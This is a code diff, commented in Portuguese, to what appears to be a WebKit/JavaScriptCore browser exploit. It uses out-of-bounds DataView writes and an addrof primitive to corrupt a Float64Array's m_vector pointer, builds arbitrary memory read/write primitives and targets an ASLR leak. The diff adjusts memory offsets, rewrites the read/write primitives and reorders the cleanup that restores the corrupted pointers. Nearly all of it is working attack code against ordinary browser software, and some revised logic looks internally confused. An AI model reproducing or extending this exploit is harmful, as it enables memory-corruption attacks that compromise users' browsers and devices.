@@ -65,7 +65,6 @@ function doubleToInt64(double) { // logFn parameter removed as it's not used
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBufferView, Corrupção de Vector de Array) ---`, "test");
-
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
 
@@ -125,24 +124,38 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`Float64Array 'rw_target_array' criado para R/W arbitrário.`, "debug");
 
         // 2. Obter o endereço do JSCell do rw_target_array
-        const rw_target_array_jscell_addr = addrof_core(rw_target_array);
+        const rw_target_array_jscell_addr = addrof_core(rw_target_array); // Usar primitiva addrof_core
         logFn(`Endereço do JSCell de 'rw_target_array': ${rw_target_array_jscell_addr.toString(true)}`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 3. Calcular o offset do m_vector dentro do JSCell do Float64Array
-        const m_vector_offset = JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // Offset do m_vector dentro do JSCell (0x18 no config)
-        const rw_target_array_m_vector_addr = rw_target_array_jscell_addr.add(m_vector_offset);
-        logFn(`Endereço do m_vector de 'rw_target_array' (calculado): ${rw_target_array_m_vector_addr.toString(true)} (offset 0x${m_vector_offset.toString(16)})`, "info");
+        // Nota: O config.mjs define M_VECTOR_OFFSET como 0x10 e M_LENGTH_OFFSET como 0x18.
+        // O log mostrou o m_length sendo expandido para 0x70 (BASE_0x58 + M_LENGTH_0x18).
+        // Isso sugere que a base de metadados é 0x58 e M_VECTOR_OFFSET é de fato 0x10 (resultando em 0x68).
+        // A leitura do m_vector em 0x68 deve ser válida. O problema anterior pode ter sido um estado instável.
+        const m_vector_offset_in_jscell = JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET;
+        const rw_target_array_m_vector_addr_in_jscell = rw_target_array_jscell_addr.add(m_vector_offset_in_jscell);
+        logFn(`Endereço do m_vector de 'rw_target_array' (calculado): ${rw_target_array_m_vector_addr_in_jscell.toString(true)} (offset 0x${m_vector_offset_in_jscell.toString(16)})`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 4. Salvar o m_vector original do oob_dataview (que aponta para oob_array_buffer_real)
-        const OOB_DV_METADATA_BASE = 0x58; // do config.mjs
-        const OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x18 = 0x70
+        // Isso é crucial antes de corromper o oob_dataview.
+        // O OOB_DV_METADATA_BASE é 0x58 (do config.mjs, assumido como a base da instância do DataView no buffer OOB)
+        // O offset do m_vector dentro dessa instância é JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET (0x10)
+        // Portanto, o offset absoluto dentro do oob_array_buffer_real para o m_vector do oob_dataview é 0x58 + 0x10 = 0x68.
+        const OOB_DV_METADATA_BASE = 0x58; // from config.mjs
+        const OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
 
-        // Corrigido: Usar oob_read_absolute para ler o QWORD
+        // O erro anterior era nesta linha. Verifique se o DataView está pronto e se a leitura é segura.
+        // Adicionando uma verificação antes para tentar mitigar instabilidade.
+        if (!oob_dataview) {
+            throw new Error("OOB DataView não está disponível antes de tentar ler seu m_vector.");
+        }
+        // Tenta ler o m_vector original do oob_dataview através do oob_read_absolute
+        // que por sua vez usa o oob_dataview_real.getUint32(offset, true)
         original_oob_dataview_m_vector_for_restore = await oob_read_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, 8);
-        if (!isAdvancedInt64Object(original_oob_dataview_m_vector_for_restore) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero)) {
-            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview em ${toHex(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER)}.`;
+        if (!isAdvancedInt64Object(original_oob_dataview_m_vector_for_restore) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
+            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview em ${toHex(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER)}. Valor lido: ${original_oob_dataview_m_vector_for_restore ? original_oob_dataview_m_vector_for_restore.toString(true) : 'N/A'}. Pode indicar corrupção, layout de memória diferente ou instabilidade após a expansão do m_length.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
@@ -150,8 +163,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
 
         // 5. Corromper o m_vector do oob_dataview_real para apontar para o m_vector do rw_target_array
-        // Corrigido: Usar oob_write_absolute para escrever o QWORD
-        await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, rw_target_array_m_vector_addr, 8);
+        await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, rw_target_array_m_vector_addr_in_jscell, 8); // Ajustado nome da variável
         logFn(`m_vector do oob_dataview_real corrompido para apontar para o m_vector do rw_target_array.`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -161,36 +173,37 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         // 6. Salvar o m_vector original do rw_target_array para restauração final
         // Isso é necessário porque vamos sobrescrevê-lo repetidamente para ARB R/W
-        original_rw_target_array_m_vector_for_restore = await oob_read_absolute(0, 8); // Lê o m_vector do rw_target_array através do OOB-DV corrompido
-        if (!isAdvancedInt64Object(original_rw_target_array_m_vector_for_restore) || original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.Zero)) {
-            const errorMsg = `Falha crítica ao ler o m_vector original do rw_target_array através do OOB DataView.`;
+        original_rw_target_array_m_vector_for_restore = doubleToInt64(rw_target_array[0]); // Lê o m_vector do rw_target_array diretamente através do array
+        if (!isAdvancedInt64Object(original_rw_target_array_m_vector_for_restore) || original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.Zero) || original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
+            const errorMsg = `Falha crítica ao ler o m_vector original do rw_target_array (via rw_target_array[0]). Valor lido: ${original_rw_target_array_m_vector_for_restore ? original_rw_target_array_m_vector_for_restore.toString(true) : 'N/A'}.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
-        logFn(`m_vector original do rw_target_array lido (via OOB DataView): ${original_rw_target_array_m_vector_for_restore.toString(true)}`, "debug");
+        logFn(`m_vector original do rw_target_array lido (via rw_target_array[0]): ${original_rw_target_array_m_vector_for_restore.toString(true)}`, "debug");
 
 
         // 7. Definir a primitiva de leitura arbitrária de 8 bytes (arb_r)
         arb_r = async (addr) => {
             // Corrompe o m_vector do rw_target_array para apontar para o endereço desejado
-            await oob_write_absolute(0, addr, 8); // Escreve o novo ponteiro no m_vector do rw_target_array (usando OOB-DV)
+            rw_target_array[0] = int64ToDouble(addr); // Escreve o novo ponteiro no m_vector do rw_target_array
             // Lê o valor através do rw_target_array (agora aponta para addr)
             const value = doubleToInt64(rw_target_array[0]); // Lê o primeiro elemento do array como Int64
             // Restaura o m_vector do rw_target_array (para evitar GC/crash)
-            await oob_write_absolute(0, original_rw_target_array_m_vector_for_restore, 8);
+            rw_target_array[0] = int64ToDouble(original_rw_target_array_m_vector_for_restore);
             return value;
         };
 
         // 8. Definir a primitiva de escrita arbitrária de 8 bytes (arb_w)
         arb_w = async (addr, value) => {
-            // Converte o valor para double
-            const value_double = int64ToDouble(value);
+            // Salva o m_vector atual (corrompido ou original)
+            const current_rw_target_array_m_vector = doubleToInt64(rw_target_array[0]);
+
             // Corrompe o m_vector do rw_target_array para apontar para o endereço desejado
-            await oob_write_absolute(0, addr, 8);
+            rw_target_array[0] = int64ToDouble(addr);
             // Escreve o valor através do rw_target_array
-            rw_target_array[0] = value_double;
-            // Restaura o m_vector do rw_target_array
-            await oob_write_absolute(0, original_rw_target_array_m_vector_for_restore, 8);
+            rw_target_array[0] = int64ToDouble(value);
+            // Restaura o m_vector do rw_target_array para seu valor anterior (seja original ou corrompido temporariamente)
+            rw_target_array[0] = int64ToDouble(current_rw_target_array_m_vector);
         };
 
         logFn(`Primitivas de Leitura/Escrita Arbitrária TOTAL construídas com sucesso. Tempo: ${(performance.now() - arbSetupStartTime).toFixed(2)}ms`, "good");
@@ -346,16 +359,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         post_typed_array_spray = [];
         global_spray_objects = []; // Clear main spray
 
-        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-
-        // IMPORTANT: Restore the OOB DataView's m_vector to its original value
-        // This prevents a potential crash if the page is not reloaded immediately.
+        // A clearOOBEnvironment interna será chamada na próxima linha.
+        // O crucial é restaurar os ponteiros para um estado estável ANTES de clearOOBEnvironment.
         const OOB_DV_METADATA_BASE = 0x58; // from config.mjs
-        const OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x18 = 0x70
+        const OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE + JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
 
-        if (oob_dataview && original_oob_dataview_m_vector_for_restore && !original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero)) { // Check for valid saved value
+        // Tenta restaurar o m_vector original do oob_dataview
+        if (oob_dataview && original_oob_dataview_m_vector_for_restore && !original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero) && !original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
              try {
-                // Corrigido: Usar oob_write_absolute para restaurar o QWORD
+                // Restaurar o ponteiro do m_vector do oob_dataview_real para o seu valor original
                 await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, original_oob_dataview_m_vector_for_restore, 8);
                 logFn(`Restaurado m_vector original do oob_dataview.`, "debug");
              } catch (e_restore_final) {
@@ -365,24 +377,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`AVISO: Não foi possível restaurar o m_vector original do oob_dataview na limpeza final (original_oob_dataview_m_vector_for_restore inválido ou oob_dataview nulo).`, "warn");
         }
 
-        // Restore rw_target_array's m_vector to its original value if it was corrupted
-        if (rw_target_array && original_rw_target_array_m_vector_for_restore && !original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.Zero)) {
+        // Tenta restaurar o m_vector original do rw_target_array
+        if (rw_target_array && original_rw_target_array_m_vector_for_restore && !original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.Zero) && !original_rw_target_array_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
             try {
-                // This restoration uses the OOB DataView, as its m_vector was already restored
-                // The OOB DataView points back to oob_array_buffer_real's metadata, not rw_target_array's m_vector
-                // So, we need to temporarily corrupt it again to restore rw_target_array's m_vector
-                // This gets complicated. A simpler approach for cleanup in a real exploit
-                // is to just reload the page/crash. For a test, we can try a best effort.
-
-                // Temporarily corrupt OOB-DV to point to rw_target_array's m_vector again
-                await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, rw_target_array_m_vector_addr, 8);
-                // Now, write the original m_vector back to rw_target_array
+                // Se o rw_target_array foi corrompido, o oob_dataview_real foi configurado para apontar para o m_vector do rw_target_array.
+                // Após restaurar o oob_dataview_real para seu próprio m_vector original,
+                // devemos agora usar o rw_target_array para restaurar seu próprio m_vector.
+                // Como rw_target_array[0] é a forma de manipular o m_vector (e espera-se que o Array esteja íntegro novamente),
+                // podemos simplesmente atribuir o valor original.
                 rw_target_array[0] = int64ToDouble(original_rw_target_array_m_vector_for_restore);
-                // Restore OOB-DV's m_vector back to its original
-                await oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, original_oob_dataview_m_vector_for_restore, 8);
-
                 logFn(`Restaurado m_vector original do rw_target_array.`, "debug");
-
             } catch (e_rw_restore_final) {
                 logFn(`ERRO CRÍTICO na limpeza final ao restaurar m_vector do rw_target_array: ${e_rw_restore_final.message}`, "critical");
             }
@@ -390,6 +394,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`AVISO: Não foi possível restaurar o m_vector original do rw_target_array na limpeza final.`, "warn");
         }
 
+        // Finalmente, limpa o ambiente OOB principal.
+        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
         logFn(`Limpeza final concluída. Tempo total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
     }
